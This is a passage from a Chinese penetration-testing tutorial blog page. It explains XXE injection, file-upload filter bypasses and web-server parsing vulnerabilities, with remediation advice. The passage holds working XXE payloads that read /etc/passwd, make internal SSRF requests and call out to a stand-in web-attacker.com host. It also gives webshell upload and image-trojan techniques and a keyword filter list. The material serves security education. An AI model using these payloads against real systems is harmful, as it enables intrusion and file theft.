(to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt; <br>    &lt;!ELEMENT to (<span class="hljs-comment">#PODATA)&gt;      &lt;!--定义to元素为&quot;#PODATA&quot;类型--&gt; </span><br>    &lt;!ELEMENT from (<span class="hljs-comment">#PODATA)&gt;    &lt;!--定义from元素为&quot;#PODATA&quot;类型--&gt; </span><br>    &lt;!ELEMENT <span class="hljs-built_in">head</span> (<span class="hljs-comment">#PODATA)&gt;    &lt;!--定义head元素为&quot;#PODATA&quot;类型--&gt; </span><br>    &lt;!ELEMENT body (<span class="hljs-comment">#PODATA)&gt;    &lt;!--定义body元素为&quot;#PODATA&quot;类型--&gt;</span><br>]&gt;<br><br>&lt;!--文档元素--&gt;<br>&lt;note&gt;<br>&lt;to&gt;Tove&lt;/to&gt;<br>&lt;from&gt;Jani&lt;/from&gt;<br>&lt;heading&gt;Reminder&lt;/heading&gt;<br>&lt;body&gt;Don<span class="hljs-string">&#x27;t forget me this weekend!&lt;/body&gt;</span><br><span class="hljs-string">&lt;/note&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="2、漏洞简介"><a href="#2、漏洞简介" class="headerlink" title="2、漏洞简介"></a>2、漏洞简介</h4><p>· XML 外部实体注入漏洞（XML External Entity Injection）简称XXE。</p>
+<p>· XXE漏洞发生在应用程序解析XML输入时，由于没有禁止外部实体的加载，导致可加载恶意外部文件，造成任意文件读取、命令执行、内网探测和攻击、引起dos攻击等危害。</p>
+<p>· XML外部实体注入攻击漏洞是在对<code>非安全的外部实体数据</code>进行处理时引发的安全问题，触发的点往往是<code>可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件</code>，造成攻击危害。</p>
+<h4 id="3、漏洞原理"><a href="#3、漏洞原理" class="headerlink" title="3、漏洞原理"></a>3、漏洞原理</h4><blockquote>
+<p>服务端接收并解析了来自用户端的xml数据,并且没有做严格的安全控制,从而导致xml外部实体注入。</p>
+</blockquote>
+<p>更细致地说：</p>
+<p>既然XML可以从外部读取DTD文件，那我们就自然地想到了如果将路径换成另一个文件的路径，那么服务器在解析这个XML的时候就会把那个文件的内容赋值给SYSTEM前面的实体中，只要我们在XML中让前面的实体的内容显示出来，不就可以读取那个文件的内容了。这就造成了一个任意文件读取的漏洞。</p>
+<p>那如果我们指向的是一个内网主机的端口呢？是否会给出错误信息，我们是不是可以从错误信息上来判断内网主机这个端口是否开放，这就造成了一个内部端口被探测的问题。</p>
+<p>另外，一般来说，服务器解析XML有两种方式：一种是<code>一次性将整个XML加载进内存中，进行解析</code>；另一种是<code>一部分一部分的、“流式”地加载、解析</code>。如果我们递归地调用XML定义，一次性调用巨量的定义，那么服务器的内存就会被消耗完，造成了拒绝服务攻击（Dos）。</p>
+<h4 id="4、XXE攻击类型"><a href="#4、XXE攻击类型" class="headerlink" title="4、XXE攻击类型"></a>4、XXE攻击类型</h4><blockquote>
+<p>主要有四种XXE攻击类型：</p>
+<ul>
+<li>利用XXE获取文件内容</li>
+<li>利用XXE发动SSRF攻击</li>
+<li>利用XXE盲打获取带外（OAST）数据</li>
+<li>利用XXE盲打，通过报错信息获取数据</li>
+</ul>
+<p>其实上面这四个分类是有点泛的说法。依照实际情况来说呢，XXE的漏洞利用主要有：</p>
+<p>任意文件读取（有回显、无回显）、探测SQL盲注、探测内网地址/端口、攻击内网网站、执行系统命令、netdoc协议读取文件、Dos拒绝服务攻击</p>
+</blockquote>
+<h4 id="5、漏洞发现"><a href="#5、漏洞发现" class="headerlink" title="5、漏洞发现"></a>5、漏洞发现</h4><p><code>寻找XML输入点</code>！</p>
+<ul>
+<li>人工方式</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722241085705.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ul>
+<li>工具利用</li>
+</ul>
+<blockquote>
+<p>在线工具：<a target="_blank" rel="noopener" href="http://ceye.io/%E3%80%81">http://ceye.io/、</a> <a target="_blank" rel="noopener" href="http://www.dnslog.cn/%E3%80%81">http://www.dnslog.cn/、</a> <a target="_blank" rel="noopener" href="https://dnslog.io/">https://dnslog.io/</a></p>
+</blockquote>
+<h4 id="6、XEE漏洞利用"><a href="#6、XEE漏洞利用" class="headerlink" title="6、XEE漏洞利用"></a>6、XEE漏洞利用</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42282667/article/details/123359030">XML实体注入漏洞姿势总结</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/374863.html">服务器端漏洞篇之XML外部实体注入(XXE)专题</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/9302528.html">XML与xxe注入基础知识</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lady_killer9/article/details/108448865">XXE（XML外部实体注入）原理、攻击及防御</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/177979.html">XXE漏洞利用技巧：从XML到远程代码执行</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/dreamthe/article/details/121332152">XXE漏洞原理及防御方式。</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64481831/article/details/136140050">XEE漏洞详解（全面）</a></p>
+<ul>
+<li>利用XXE获取文件内容</li>
+</ul>
+<p>例如：在DTD定义中声明一个外部实体，指定使用file伪协议的文件路径从而获取文件的内容。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt; ]&gt;<br>&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;<br></code></pre></td></tr></table></figure>
+
+<p>注入的方法是，随机触发并抓取一个POST请求数据包，然后发送到 repeater ，在里面添加上述自定义实体（直接在数据包末尾添加即可），然后发送。</p>
+<ul>
+<li>利用XXE发动SSRF攻击</li>
+</ul>
+<p>这种攻击的原理是：<code>通过XXE诱导服务器访问指定的URL从而发动SSRF攻击</code>，例如:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM <span class="hljs-string">&quot;http://internal.vulnerable-website.com/&quot;</span>&gt; ]&gt;<br></code></pre></td></tr></table></figure>
+
+<p>主要就是将外部实体的URL替换为可以获取用户敏感信息的URL。</p>
+<p>构造payload的方式，也就是实现的方式，和上述类似，也是在抓取数据包，在数据包末尾添加自定义的DTD实体然后重放。</p>
+<ul>
+<li>使用带外（OAST）技术探测XXE盲打</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9519?time__1311=n4+xnD0DuAeWq0KGQtDsA3xCwjLDgiDxGwxnHID">盲XXE攻击 -带外交互技术(OAST) 泄露数据</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hamletal/article/details/120487604">带外应用安全测试（OAST）-含义解释</a></p>
+<blockquote>
+<p>OAST带外应用程序安全测试，使用外部服务器查看不可见的漏洞</p>
+<p>盲打：是指黑客或攻击者在未经授权的情况下进行的攻击活动，而攻击者在进行这些活动时没有明确的目标或特定的目标信息。盲打攻击可以是对广泛范围的网络或系统进行扫描和攻击，以寻找可能存在的漏洞或弱点，而非专门针对某个具体的目标进行攻击。</p>
+</blockquote>
+<p>利用XXE发动SSRF攻击，带外技术通过XXE与远端服务器进行交互，从而探测是否存在XXE盲打漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM <span class="hljs-string">&quot;http://f2g9j7hhkax.web-attacker.com&quot;</span>&gt; ]&gt;<br></code></pre></td></tr></table></figure>
+
+<p>当中的URL，应该就是外部服务器地址了。</p>
+<p>有些情况下，目标服务器对常规XXE攻击进行了防护，不过我们可以尝试使用<code>XML参数实体</code>，例如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM <span class="hljs-string">&quot;http://f2g9j7hhkax.web-attacker.com&quot;</span>&gt; %xxe; ]&gt;<br></code></pre></td></tr></table></figure>
+
+<p>通过定义参数实体同样可以用来探测XXE盲打。</p>
+<ul>
+<li>利用XXE盲打，通过报错信息获取数据</li>
+</ul>
+<p>可以通过触发XML解析错误将敏感信息泄漏在报错信息中，例如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!ENTITY % file SYSTEM <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;<br>&lt;!ENTITY % <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;</span>&gt;<br>%<span class="hljs-built_in">eval</span>;<br>%error;<br></code></pre></td></tr></table></figure>
+
+<p>一般来说，能看到加载了一个不存在的文件触发XML报错，但是后面加载的file实体指定的文件是存在的，所以XML报错信息中就能泄漏这个文件的内容了。</p>
+<p>然后其它的利用方式可以参考上述的链接，有些小众的利用方式未必会成功。</p>
+<h4 id="7、漏洞防御-1"><a href="#7、漏洞防御-1" class="headerlink" title="7、漏洞防御"></a>7、漏洞防御</h4><ul>
+<li>使用开发语言提供的禁用外部实体的方法</li>
+</ul>
+<blockquote>
+<p>php：</p>
+<p>libxml_disable_entity_loader(true);</p>
+<p>Java：</p>
+<p>DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false);</p>
+<p>Python：</p>
+<p>from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p>
+</blockquote>
+<ul>
+<li>过滤用户提交的XML数据</li>
+</ul>
+<p>关键词：<!DOCTYPE和<!ENTITY，或者是 SYSTEM和PUBLIC</p>
+<ul>
+<li>不允许XML中含有自定义的DTD</li>
+</ul>
+<h3 id="⑦文件上传漏洞"><a href="#⑦文件上传漏洞" class="headerlink" title="⑦文件上传漏洞"></a>⑦文件上传漏洞</h3><h4 id="1、漏洞简介-4"><a href="#1、漏洞简介-4" class="headerlink" title="1、漏洞简介"></a>1、漏洞简介</h4><p>文件上传是现代互联网常见的功能。允许用户上传图片、视频、及其他类型文件，向用户提供的功能越多，web受攻击的风险越大。上传文件时，如果未对上传的文件进行严格的验证和过滤，就容易造成文件上传漏洞，上传脚本文件。</p>
+<p><strong>文件上传漏洞</strong>是指由于网站开发人员没有对用户的文件上传部分做严格限制，导致攻击者可以绕过其本身权限向服务器上传可执行的动态脚本文件。</p>
+<p>比如，<code>对文件上传路径变量过滤不严</code>，<code>对用户上传的文件后缀以及文件类型限制不严</code>，则攻击者可以通过Web访问的目录<code>上传任意文件</code>，包括<code>网站后门文件</code>、<code>动态脚本执行文件</code>等（木马、病毒、webshell），并能将这些文件传递给解释器，从而实现<code>远程控制网站服务器</code>的效果。</p>
+<h4 id="2、漏洞原理"><a href="#2、漏洞原理" class="headerlink" title="2、漏洞原理"></a>2、漏洞原理</h4><p>目标网站：</p>
+<p>· 对文件上传路径变量过滤不严</p>
+<p>· 对用户上传的文件后缀限制不严</p>
+<p>· 对用户上传的文件类型（MIMETYPE）限制不严</p>
+<p>· 权限上没有对上传的文件目录设置不可执行权限（尤其是hashbang类型文件）</p>
+<p>· web服务器端没有对上传文件或指定目录的行为做限制</p>
+<p>· web端系统并未对网站的文件上传行为进行检测或检测的逻辑不够严谨</p>
+<blockquote>
+<p>hashbang，也称为“shebang”，是指脚本文件中第一行中出现的特殊标记，它用于指定该脚本应该由哪个解释器来执行。这一标记通常由字符<code>#!</code>组成，后跟解释器路径。</p>
+<p>例如：<code>\#!/bin/bash</code>表示使用Bash解释器，或者是<code>\#!/usr/bin/env python3</code>表示使用python3解释器</p>
+</blockquote>
+<h4 id="3、漏洞检测"><a href="#3、漏洞检测" class="headerlink" title="3、漏洞检测"></a>3、漏洞检测</h4><blockquote>
+<ul>
+<li>前端js检测：</li>
+</ul>
+<p>绕过方法：禁用javascript；修改前端代码，添加需要上传的脚本语言扩展名；burpsuite抓包修改filename参数。</p>
+<ul>
+<li>后端检测文件类型</li>
+</ul>
+<p>~检测<code>content-type</code>：</p>
+<p>​	检测原理：后端获取http请求包的Content-Type参数，判断上传文件类型</p>
+<p>​	绕过方法：抓包将</p>
+</blockquote>
+<h4 id="4、漏洞利用"><a href="#4、漏洞利用" class="headerlink" title="4、漏洞利用"></a>4、漏洞利用</h4><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><blockquote>
+<p>Web服务器要开启文件上传功能，并且上传api（接口）对外“开放” (Web 用户可以访问）;</p>
+<p>Web用户对目标目录具有可写权限，甚至具有执行权限，一般情况下，Web目录都有执行权限。</p>
+<p>要想完美利用文件上传漏洞，就要上传的文件可以执行，也就是Web容器可以解析我们上传的脚本，无论脚本以什么样的形式存在。</p>
+</blockquote>
+<h5 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h5><ul>
+<li>判断上传漏洞点</li>
+<li>获得文件上传的URL</li>
+<li>检测防御类型</li>
+</ul>
+<h4 id="5、文件上传漏洞绕过"><a href="#5、文件上传漏洞绕过" class="headerlink" title="5、文件上传漏洞绕过"></a>5、文件上传漏洞绕过</h4><ul>
+<li><h5 id="客户端检测与绕过（JS检测绕过）"><a href="#客户端检测与绕过（JS检测绕过）" class="headerlink" title="客户端检测与绕过（JS检测绕过）"></a>客户端检测与绕过（JS检测绕过）</h5></li>
+</ul>
+<p>客户端（Client）：常称为用户端（前端），与服务器相对应。由于客户端对于文件上传漏洞的防御是通过JS代码实现的，所以客户端检测绕过也成为JS检测绕过。</p>
+<blockquote>
+<p>检测原理：调用JS的selectFile()函数，先将文件名转换为小写，然后通过substr()获取文件名最后一个点号后面的后缀（包括点号）进行判断。</p>
+<p>绕过方法：由于后端PHP代码没有对文件做任何检测，所以只要绕过前端JS的校验就可以上传webshell。绕过前端JS校验的方法有二：</p>
+<p>· 删除浏览器事件（把action标签中“return selectFile()”删除）</p>
+<p>· 利用Burpsuite抓包修改文件后缀（比如将后缀修改为php）</p>
+</blockquote>
+<ul>
+<li><h5 id="服务端检测与绕过"><a href="#服务端检测与绕过" class="headerlink" title="服务端检测与绕过"></a>服务端检测与绕过</h5></li>
+<li><p>后缀名检测与绕过</p>
+</li>
+</ul>
+<blockquote>
+<p>检测原理：通过函数phpinfo()获取文件后缀，然后判断其是不是“php”</p>
+<p>绕过方法：</p>
+<p>··· 黑名单：（只针对黑名单中没有的后缀名，文件上传才能成功）</p>
+<p>· 大小写绕过（如写成PHp）</p>
+<p>· 特殊扩展名绕过，比如php可以用php3、php4、php5代替</p>
+<p>· 名单列表绕过（指黑名单之外的后缀名）</p>
+<p>· windows特性（一些特殊的文件名命名方式在win下是不被允许的，利用Burpsuite抓包修改后缀名，绕过验证后上传文件，windows会自动去掉后面添加的，但这特性是win特有的，Unix/Linux没有这个特性）：</p>
+<p>对应windows特性的绕过方法一是<code>点绕过</code>，win下文件后缀名最后一个点会被自动去除，而Linux系统下不会。因此可以利用burpsuite工具拦截http请求，上传文件后缀名，然后＋<code>.</code>绕过上传（例如：<code>demo.php.</code>）。</p>
+<p>对应windows特性的绕过方法二是<code>::$DATA绕过</code>，win下，如果上传的文件名为<code>a.php::$DATA</code>，那么它会在服务器上生成一个<code>a.php</code>文件，其中内容和所上传内容相同，且会被解析。场景利用也是通过拦截请求然后修改数据包，在对应的文件后缀处添加<code>::$DATA</code>（注意！win下无法直接测试::$DATA，因为win不允许后缀名中存在特殊字符）</p>
+<p>· <code>.htaccess</code>文件攻击（前提是apache开启.htaccess文件功能）：</p>
+<p>.htaccess是apache服务器中的分布式配置文件（IIS中不存在该文件），该配置文件会覆盖apache服务器的全局配置，作用于当前目录及其子目录。如果一个web应用允许上传.htaccess文件，那意味着攻击者可以更改apache的配置，很危险。在httpd.conf配置文件中，AllowOverride参数就是指明Apache服务器是否去找.htacess文件作为配置文件，如果设置为none,那么服务器将忽略.htacess文件;如果设置为All,那么所有在.htaccess文件里有的指令都将被重写，即允许.htaccess 文件覆盖掉Apache的配置。将内容符合php语法规则的文件当作PHP文件解析，<code>&lt;Directory /&gt; AllowOverride All &lt;/Directory&gt;</code></p>
+<p>··· 白名单：</p>
+<p><code>白名单绕过需要配合文件包含漏洞或解析漏洞，%00截断</code>，而且，只针对白名单中有的后缀名，文件才能上传成功。</p>
+</blockquote>
+<ul>
+<li>MIME类型检测与绕过</li>
+</ul>
+<p>MIME是描述消息内容类型的因特网标准，MIME消息能包含文本、图像、音频、视频以及其它应用程序专用的数据。</p>
+<blockquote>
+<p>常见的MIME类型如下：</p>
+<p>文件扩展名		MIME-type</p>
+<p>.js					application/x-javascript</p>
+<p>.html				 text/html</p>
+<p>.jpg				   image/jpeg</p>
+<p>.png				  image/png</p>
+<p>.pdf				   application/pdf</p>
+</blockquote>
+<blockquote>
+<p>检测原理：判断<code>$_FILES[&quot;file&quot;][&quot;type&quot;]</code>是不是图片格式，不是则不允许上传。在http协议中，使用<code>Content-Type</code>字段表示文件的MIME类型，<code>$_FILES[&quot;file&quot;][&quot;type&quot;]</code>的值是从请求数据包中的<code>Content-Type</code>中获取的。</p>
+<p>绕过方法：通过抓取数据包，上传php文件（同样也是在数据包后面追加php代码），Content-Type的值是application/octer-stream，上传jpg格式的文件时，Content-Type的值是 image/jpeg。因此可以修改文件类型进行绕过。</p>
+</blockquote>
+<ul>
+<li>文件内容检测与绕过</li>
+</ul>
+<blockquote>
+<p>检测原理：利用getimagesize()函数获取图片的宽高等信息，如果上传的不是图片，则获取不到信息。</p>
+<p>绕过方法：在脚本文件开头补充图片对应的头部值，或者在图片后写入脚本代码</p>
+<p>···制作图片马：</p>
+<p>· 在图片后写入脚本文件</p>
+<p>· copy 1.jpg/b+1.php/a 2.jpg（参数<code>/b</code>指定以二进制格式复制、合并文件，用于图像类/声音类文件；参数<code>/a</code>指定以ASCII码格式复制、合并文件，用于txt等文档类文件）</p>
+</blockquote>
+<ul>
+<li>00截断检测与绕过</li>
+</ul>
+<blockquote>
+<p>检测原理：截断漏洞出现的核心就是<code>chr(0)</code>，这个字符不为空（null），也不是空字符（“”），更不是空格。当程序在输出含有chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致了漏洞产生。由于00 代表结束符，PHP会把00后面的所有字符删除。</p>
+<p>截断条件：PHP版本小于5.3.4、 magic_quotes_gpc为OFF状态</p>
+<p>注意：GET型可以对<code>%00</code>自动解码，但POST型不能，需要在二进制中修改</p>
+<p>如果目标存在文件包含漏洞的话，那可以先上传图片马再通过文件包含漏洞来拿shell</p>
+</blockquote>
+<ul>
+<li>条件竞争</li>
+</ul>
+<blockquote>
+<p>一些网站文件检测逻辑是先允许上传任意文件，然后检查文件内容是否包含可执行脚本，如果包含则删除。这里使用sleep() 函数来模拟判断是否含有脚本所需要的时间。</p>
+<p>绕过方法：利用<code>成功上传</code>到<code>删除文件</code>的时间差，上传一个.php文件，在未删除之前立即访问，则会自动生成一个新php文件，新文件不会被删除。</p>
+</blockquote>
+<h4 id="6、配合文件解析漏洞"><a href="#6、配合文件解析漏洞" class="headerlink" title="6、配合文件解析漏洞"></a>6、配合文件解析漏洞</h4><h5 id="什么是文件解析"><a href="#什么是文件解析" class="headerlink" title="什么是文件解析"></a>什么是文件解析</h5><p>当服务器接收到一个Http请求的时候，服务器首先需要决定如何去处理这个请求（服务器处理一个.htm页面和一个.aspx页面肯定是不一样)。</p>
+<p>那服务器依据什么去处理呢?</p>
+<p>答：根据文件的后缀名。</p>
+<p>服务器获取所请求的页面(也可以是文件，比如1.jpg）的后缀名以后，接下来会在服务器端寻找可以处理这类后缀名的应用程序，如果服务器找不到可以处理此类文件的应用程序，那么服务器将直接把这个文件返还给客户端。</p>
+<h5 id="什么是解析漏洞"><a href="#什么是解析漏洞" class="headerlink" title="什么是解析漏洞"></a>什么是解析漏洞</h5><p>解析漏洞是指服务器应用程序在解析某些精心构造的后缀文件时，会将其解析成网页脚本，从而导致网站的沦陷。大部分解析漏洞的产生都是由<code>应用程序本身的漏洞</code>导致的。</p>
+<h5 id="常见的解析漏洞"><a href="#常见的解析漏洞" class="headerlink" title="常见的解析漏洞"></a>常见的解析漏洞</h5><ul>
+<li><strong>IIS 5.x/IIS 6.0解析漏洞</strong></li>
+</ul>
+<p>在IIS 5.x/IIS 6.0中存在以下两个解析漏洞：</p>
+<blockquote>
+<p>（1）<strong>目录解析漏洞</strong></p>
+<p>在网站中建立名字为*.asp或.asa的文件夹，其目录内的任何扩展名文件都会被IIS当做ASP文件来解析并执行。</p>
+<p>例如：创建一个目录test.asp，那么/test.asp/1.jpg将被当做ASP文件来执行。（<code>/xx.asp/xx.jpg</code>）</p>
+<p>（2）<strong>文件解析漏洞</strong></p>
+<p>网站上传图片的时候，如果将网页木马文件的名字改成<code>*.asp;1.jpg</code>，分号后面的不被解析，也就是说，<code>*.asp;1.jpg</code>会被服务器看成是<code>*.asp</code>，就可以绕过服务器禁止上传ASP文件的限制，这样的畸形文件也同样会被IIS当做ASP文件来解析并执行。</p>
+<p>例如：上传一个图片文件名为<code>test.asp;1.jpg</code>的木马文件，该文件可以被当做ASP文件解析并执行。<br>在IIS6.0版本中，默认可执行文件除了<code>test.asp</code>以外，还包括<code>test.asa</code>、<code>test.cer</code>、<code>test.cdx</code>这三种，同样也存在解析漏洞。</p>
+</blockquote>
+<p><strong>plus：</strong></p>
+<p>asp.dll代码的大致流程：</p>
+<p>1、请求<code>test.asp;1.jpg</code></p>
+<p>2、从头查找<code>.</code>号，获得<code>.asp;1.jpg</code> </p>
+<p>3、找到<code>;</code>号，如果有，则内存截断</p>
+<p>4、找到<code>/</code>号，如果有，则内存截断</p>
+<p>5、最终，将保留下来<code>.asp</code>字符串</p>
+<ul>
+<li><strong>IIS 7.0/IIS 7.5 || Nginx解析漏洞</strong></li>
+</ul>
+<p>IIS 7.0/IIS 7.5或Nginx在使用FastCGI方式调用php时，在<code>php.ini</code>里设置<code>cgi.fix_pathinfo=1</code>，这使得访问任意文件URL时，在URL后面添加<code>/x.php</code>等字符时，该文件被IIS当成<code>php文件代码</code>解析。</p>
+<p>在某些使用有漏洞的网站中，访问<code>http://127.0.0.1/1.jpg/1.php</code>，此时的1.jpg会被当作<code>PHP脚本</code>来解析,而<code>1.php本身是不存在的</code>。</p>
+<p>这就意味着攻击者可以上传合法的“图片”（<code>图片木马</code>），然后在URL后面加上<code>/xxx.php</code>，就可以获得网站的WebShell，然后再使用中国菜刀连接即可。</p>
+<blockquote>
+<p>原因：当FastCGI在处理<code>.php</code>文件时发现文件并不存在，这时php.ini配置文件中<code>cgi.fix_pathinfo=1</code>发挥作用,这项配置用于修复路径,如果当前路径不存在则<code>采用上层路径</code>。PHP会认为SCRIPT_FILENAME是1.jpg，而1.php是PATH_INFO，然后PHP 就把1.jpg当作一个PHP文件来解释执行。</p>
+</blockquote>
+<ul>
+<li><strong>Nginx 空字节代码执行漏洞</strong></li>
+</ul>
+<p>影响版本：0.5 ,0.6 , 0.7 <= 0.7.65, 0.8 <= 0.8.37</p>
+<p>当使用<code>PHP-FastCGI</code>执行PHP时，遇到url里面存在%00空字节时与<code>FastCGI</code>的处理不一致，导致可<code>在非PHP文件中嵌入PHP代码</code>，通过访问<code>url + %00.PHP</code>来执行其中的PHP代码。</p>
+<blockquote>
+<p>例如：<code>http://127.0.0.1/1.jpg%00.php</code>会把1.jpg文件（木马文件）当做PHP文件来执行。</p>
+<p>利用：xxx.jpg%00.php</p>
+</blockquote>
+<ul>
+<li><strong>apache解析漏洞</strong></li>
+</ul>
+<p><strong>漏洞原理</strong></p>
+<p>Apache 解析文件的规则是：<code>从右到左</code>开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar2 ,“.owf”和”.rar2” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php文件。</p>
+<p>注意~！尽管上传如此命名的文件<code>www.xxxx.xxx.com/test.php.xxx.yyy</code>会因为一些不可识别文件解析后缀而被交给php处理，但是有可能我们去访问时，发现文件并没有被解析，这是因为apache本身根本不存在所谓的解析漏洞，最后一步虽然交给了php来处理文件，但是php也不认识那些不可识别文件解析后缀，因此会以DefaultType的默认值“text/plain”来当作文本解析。</p>
+<p><strong>配置问题导致的漏洞</strong></p>
+<p>（1）如果在 Apache 的 conf 里有这样一行配置<code> AddHandler php5-script .php</code> 这时,只要文件名里包含<code>.php </code>,即使文件名是 test2.php.jpg , 也会以 php 来执行。</p>
+<p>（2）如果在 Apache 的 conf 里有这样一行配置 <code>AddType application/x-httpd-php .jpg </code>即使扩展名是 jpg，一样能以 php 方式执行。</p>
+<blockquote>
+<p>解析漏洞的产生，是由于运维人员在配置服务时，为了使apache服务器能解析php，而自己添加一个handle，</p>
+<p>例如：<code>AddType application/x-httpd-php.php</code>，它的作用也是为了让apache把php文件交给php_module解析。但是注意到它与<code>SetHandler：</code>的后缀不是用正则去匹配的，所以，在文件名的任何位置匹配到php后缀，它都会让php_module解析。</p>
+</blockquote>
+<p><strong>apache换行解析漏洞</strong></p>
+<p>影响版本：2.4.0~2.4.29 （CVE-2017-15715）</p>
+<p>此漏洞的出现是由于 apache 在<code>修复第一个后缀名解析漏洞</code>时，用<code>正则</code>来<code>匹配后缀</code>。在解析php时xxx.php\x0A 将被按照php 后缀进行解析，导致绕过一些服务器的安全策略。</p>
+<h4 id="7、漏洞危害以及修复建议"><a href="#7、漏洞危害以及修复建议" class="headerlink" title="7、漏洞危害以及修复建议"></a>7、漏洞危害以及修复建议</h4><ul>
+<li><strong>漏洞危害</strong></li>
+</ul>
+<p>1、文件上传漏洞最直接的威胁就是上传任意文件，包括恶意脚本、可执行程序等。</p>
+<p>2、如果web 服务器所保存上传文件的可写目录具有执行权限，那么就可以直接上传后门文件，导致网站沦陷。</p>
+<p>3、如果攻击者通过其他漏洞进行提权操纵，拿到系统管理权限，那么直接导致服务器沦陷。</p>
+<p>4、同服务器下的其他网站无一幸免，均会被攻击者控制。</p>
+<ul>
+<li><strong>修复建议</strong></li>
+</ul>
+<p>1、对上传的文件在服务器上存储时进行重命名</p>
+<p>2、检查上传文件的类型和大小</p>
+<p>3、禁止上传危险的文件类型，如jsp jar war等</p>
+<p>4、只接受指定类型的文件</p>
+<h3 id="⑧反序列化漏洞"><a href="#⑧反序列化漏洞" class="headerlink" title="⑧反序列化漏洞"></a>⑧反序列化漏洞</h3><h4 id="1、先验知识-2"><a href="#1、先验知识-2" class="headerlink" title="1、先验知识"></a>1、先验知识</h4>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" class="print-no-link">#基础漏洞</a>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/" class="print-no-link">#渗透流程</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>渗透测试·完整版</div>
+      <div>https://haoisbinlove.github.io/2024/08/02/渗透测试·完整版/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Sweety</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/02/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%E3%80%81CSRF/" title="基础漏洞（一）之SQL注入、XSS、SSRF、CSRF">
+                        <span class="hidden-mobile">基础漏洞（一）之SQL注入、XSS、SSRF、CSRF</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
